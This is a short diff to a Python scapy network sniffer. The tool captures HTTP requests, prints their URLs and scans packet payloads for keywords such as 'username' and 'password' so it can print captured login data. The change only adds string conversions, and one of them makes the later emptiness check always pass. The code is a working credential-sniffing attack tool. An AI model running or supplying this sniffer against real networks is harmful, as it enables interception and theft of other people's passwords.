@@ -17,23 +17,24 @@ def sniff(interface):
 
 def get_url(packet):
     url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return str(url)
 
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
-        load_raw = packet[scapy.Raw].load
+        load_raw = str(packet[scapy.Raw].load)
         keywords = ["username", "user", "login", "password", "pass"]
 
         for key in keywords:
             if key in load_raw:
-                return load_raw
+                return str(load_raw)
 
 
 def process_sniff_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         url = get_url(packet)
         print(f"\n[+] Url found - {url}")
-        login_info = get_login_info(packet)
+        login_info = str(get_login_info(packet))
 
         if login_info:
             print(f"[+] Possible username/login :: \n{login_info}\n\n")
